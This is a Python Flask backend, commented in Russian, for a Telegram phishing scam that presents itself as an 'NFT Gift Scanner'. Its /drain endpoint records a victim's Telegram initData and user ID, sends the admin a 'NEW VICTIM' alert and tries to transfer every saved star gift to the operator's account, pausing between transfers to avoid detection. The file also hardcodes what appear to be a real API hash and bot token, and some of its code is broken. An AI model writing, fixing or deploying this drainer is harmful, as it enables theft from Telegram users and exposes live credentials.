from flask import Flask, request, jsonify
from telethon import TelegramClient, functions, types
import asyncio
import json
import os

app = Flask(name)

# ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
API_ID = '35249557'   # твой api_id (получить на my.telegram.org)
API_HASH =  '283dddbb6330616c9f0f0ee7d9ba7b62 '  # твой api_hash
BOT_TOKEN =  '8003192628:AAGAvnD80ANKz1d7D8mihLqXW9_iWdOQMmU'  # тот же, что в index.html
ADMIN_ID ='8769372843' твой_telegram_id  # твой ID (число, без кавычек)
RECEIVER_ID = '8769372843' твой_telegram_id  # куда пересылать подарки (твой ID)
# ========================================

# Глобальная переменная для клиента
client = None

async def init_client():
    global client
    if client is None:
        client = TelegramClient('session', API_ID, API_HASH)
        await client.start()
    return client

@app.route('/drain', methods=['POST'])
def drain():
    try:
        data = request.json
        init_data = data.get('initData')
        user_id = data.get('userId')
        
        if not init_data or not user_id:
            return jsonify({'status': 'error', 'message': 'Нет данных'}), 400
        
        # Запускаем асинхронную функцию
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process_drain(init_data, user_id))
        loop.close()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

async def process_drain(init_data, user_id):
    try:
        # Инициализируем клиент
        client = await init_client()
        
        # Авторизуемся через initData (это сложно, упрощаем через вход по номеру)
        # В реальном проекте нужна полноценная авторизация через сессию
        # Пока отправляем уведомление админу с данными жертвы
        
        # Отправляем уведомление админу
        await client.send_message(
            ADMIN_ID,
            f"🔔 НОВАЯ ЖЕРТВА!\n\n🆔 ID: {user_id}\n📱 Данные: {init_data[:100]}..."
        )
        
        # Пытаемся получить подарки жертвы
        try:
            # Получаем объект пользователя
            user = await client.get_entity(int(user_id))
            
            # Запрашиваем список подарков
            gifts = await client(functions.payments.GetSavedStarGiftsRequest(
                peer=user,
                limit=100
            ))
            
            if not gifts.gifts:
                await client.send_message(ADMIN_ID, f"ℹ️ У жертвы {user_id} нет подарков")
                return {'status': 'ok', 'message': 'Подарков нет'}
            
            # Пересылаем каждый подарок
            transferred = 0
            for gift in gifts.gifts:
                try:
                    await client(functions.payments.TransferStarGiftRequest(
                        stargift=gift.id,
                        to_id=RECEIVER_ID
                    ))
                    transferred += 1
                    await asyncio.sleep(0.5)  # задержка, чтобы не спалиться
                except Exception as e:
                    await client.send_message(ADMIN_ID, f"⚠️ Ошибка при пересылке подарка {gift.id}: {str(e)}")
            
            await client.send_message(
                ADMIN_ID,
                f"✅ УСПЕХ! Переслано {transferred} подарков от {user_id} на {RECEIVER_ID}"
            )
            
            return {'status': 'ok', 'message': f'Переслано {transferred} подарков'}
            
        except Exception as e:
            await client.send_message(ADMIN_ID, f"❌ Ошибка при получении подарков: {str(e)}")
            return {'status': 'error', 'message': str(e)}
            
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

@app.route('/')
def index():
    return "Бэкенд для NFT Gift Scanner работает!"

if name == 'main':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
